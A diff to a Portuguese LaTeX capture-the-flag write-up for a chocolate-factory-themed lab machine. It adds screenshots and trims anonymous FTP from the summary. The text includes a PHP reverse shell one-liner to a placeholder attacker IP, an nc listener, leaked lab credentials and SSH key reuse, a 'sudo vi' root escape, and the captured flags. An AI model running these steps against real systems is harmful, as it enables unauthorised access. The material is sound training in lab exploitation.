@@ -173,8 +173,8 @@ temática do filme \emph{A Fantástica Fábrica de Chocolate}. A varredura revel
 \textbf{11 portas abertas}, mas a maioria é \emph{isca}: diversos serviços
 (portas 100, 106, 109, 110, 119, 125) respondem sempre com o mesmo \emph{banner}
 ``\emph{chocolate room}'' mandando ``\emph{procurar em outro lugar}''. O caminho
-real combina \textbf{FTP anônimo}, \textbf{enumeração web} e \textbf{reutilização
-de credenciais}. A enumeração com Gobuster expõe \emph{directory listing}, que
+real combina \textbf{enumeração web} e \textbf{reutilização
+de credenciais ssh}. A enumeração com Gobuster expõe \emph{directory listing}, que
 revela um binário ELF (\texttt{key\_rev\_key}) contendo uma chave, o
 \texttt{validate.php} com as credenciais de \texttt{charlie} em texto puro e um
 \emph{command panel} (\texttt{home.php}) usado para obter um \emph{reverse
@@ -194,8 +194,8 @@ encontrada no binário do início.
 nmap -T4 <TARGET_IP>
 \end{lstlisting}
 
-A varredura retorna \textbf{11 portas abertas}. Na prática, apenas três
-importam --- \textbf{21/FTP}, \textbf{22/SSH} e \textbf{80/HTTP}; as demais são
+A varredura retorna \textbf{11 portas abertas}. Na prática, apenas duas
+importam ---  \textbf{22/SSH} e \textbf{80/HTTP}; as demais são
 iscas (ver seção de becos sem saída).
 
 \begin{lstlisting}[style=output,caption={Portas abertas retornadas pela varredura.}]
@@ -213,6 +213,13 @@ PORT    STATE SERVICE
 125/tcp open  locus-map
 \end{lstlisting}
 
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/fig1_nmap.png}
+  \caption{Varredura Nmap contra o alvo.}
+  \label{fig:nmap}
+\end{figure}
+
 \subsection{FTP anônimo}
 O FTP aceita \emph{login} \texttt{anonymous} (senha vazia). Baixam-se todos os
 arquivos de uma vez desativando a confirmação interativa.
@@ -226,6 +233,13 @@ ftp> mget *              # baixa tudo -> gum_room.jpg
 
 O único arquivo é \texttt{gum\_room.jpg}, que \textbf{não contém informação
 útil} para o progresso.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/ftp_anonymous.png}
+  \caption{FTP anônimo: apenas gum\_room.jpg, sem informação útil.}
+  \label{fig:ftp_anonymous}
+\end{figure}
 
 \subsection{Enumeração web}
 A porta 80 serve uma página de \emph{login} (\texttt{index.html}). A enumeração
@@ -241,12 +255,26 @@ home.php    (Status: 200) [Size: 569]
 index.html  (Status: 200) [Size: 1466]
 \end{lstlisting}
 
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/gobuster.png}
+    \caption{Enumeração web com Gobuster: home.php e index.html.}
+  \label{fig:gobuster}
+\end{figure}
+
 Com \emph{directory listing} habilitado, o servidor expõe a lista completa de
 arquivos da aplicação:
 
 \begin{lstlisting}[style=output,caption={Arquivos expostos pelo directory listing.}]
 home.jpg  home.php  image.png  index.html  index.php.bak  key_rev_key  validate.php
 \end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/home_bash_execution.png}
+  \caption{Execução de bash no home}
+  \label{fig:home_bash}
+\end{figure}
 
 %============================= 2.5 EXPLORACAO ===================================
 \section{Exploração}
@@ -260,6 +288,7 @@ conteúdo (o ideal é \cmd{strings key_rev_key}), encontra-se uma chave embutida
 congratulations you have found the key:
 -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
 \end{lstlisting}
+
 
 \subsection{Reverse shell e coleta de credenciais}
 A página \texttt{home.php} contém um ponto de \textbf{execução de comandos}: o
@@ -275,6 +304,13 @@ nc -l -v -n -p 1234
 php -r '$sock=fsockopen("<ATTACKER_IP>",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 \end{lstlisting}
 
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/reverse_shell_to_www-data.png}
+  \caption{Shell reverso para o www-data}
+  \label{fig:reverse_shell}
+\end{figure}
+
 Já no \emph{shell}, a leitura de \texttt{validate.php} expõe as credenciais em
 \textbf{texto puro}:
 
@@ -288,10 +324,32 @@ if($uname=="charlie" && $password=="cn7824"){
 \fbox{\texttt{charlie : cn7824}}
 \end{center}
 
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/charlie_password.png}
+    \caption{Senha do charlie para o index.php (validate.php).}
+  \label{fig:charlie_password}
+\end{figure}
+
 \subsection{Acesso via SSH e flag de usuário}
 No \emph{home} de \texttt{charlie} há um par de chaves SSH (\texttt{teleport} e
 \texttt{teleport.pub}). Copia-se a chave privada para a máquina atacante, ajusta-se
 a permissão e autentica-se via SSH --- sem necessidade de senha.
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/charlie_private_ssh_key.png}
+  \caption{Chave privada e pública do Charlie no home do usuário.}
+  \label{fig:user_ssh_keys}
+\end{figure}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/private_key_and_ssh_to_charlie.png}
+  \caption{Chave privada e ssh para o charlie.}
+  \label{fig:private_key_ssh}
+\end{figure}
 
 \begin{lstlisting}[language=bash,caption={Acesso via chave SSH privada e leitura da flag de usuário.}]
 # chave privada 'teleport' salva localmente como id_rsa
@@ -301,6 +359,13 @@ ssh -i id_rsa charlie@<TARGET_IP>
 cat /home/charlie/user.txt
 # flag{cd5509042371b34e4826e4838b522d2e}
 \end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/user_flag.png}
+  \caption{Flag de usuário}
+  \label{fig:flag_user}
+\end{figure}
 
 %======================== 2.6 ESCALADA DE PRIVILEGIOS ==========================
 \section{Escalada de Privilégios}
@@ -320,6 +385,13 @@ sudo vi
 # dentro do vi: tecla ESC, depois digitar  :shell  e Enter
 # -> shell como root
 \end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/root_py.png}
+  \caption{Acesso ao root e acesso ao arquivo root.py.}
+  \label{fig:root_access}
+\end{figure}
 
 \subsection{Flag de root: decriptação Fernet}
 Em \texttt{/root} não há \texttt{root.txt}, e sim um script \texttt{root.py} que
@@ -342,6 +414,13 @@ print(dcrypt_mess.decode())
 Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
 flag{cec59161d338fef787fcb4e296b42124}
 \end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/root_flag_plus_python_fixed_code.png}
+  \caption{Modificação do root.py e execução final para obter a flag de root.}
+  \label{fig:root_flag}
+\end{figure}
 
 %==================== 2.7 DEAD-ENDS / PERDAS DE TEMPO ==========================
 \section{Becos sem Saída e Perdas de Tempo}
@@ -374,9 +453,18 @@ consumiu tempo sem retorno.
 \end{itemize}
 \end{becosemsaida}
 
+
+
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.95\linewidth]{img/newacc.png}
+  \caption{Mensagem dos serviços isca.}
+  \label{fig:dead-ends}
+\end{figure}
+
 %============================= 2.8 CONCLUSAO ====================================
 \section{Conclusão}
-O comprometimento encadeou várias más configurações: \textbf{FTP anônimo},
+O comprometimento encadeou várias más configurações:
 \textbf{directory listing} expondo o código-fonte e um binário com chave
 embutida, \textbf{credenciais \emph{hardcoded}} em \texttt{validate.php}, uma
 \textbf{chave SSH privada} deixada no \emph{home} do usuário e, por fim, uma
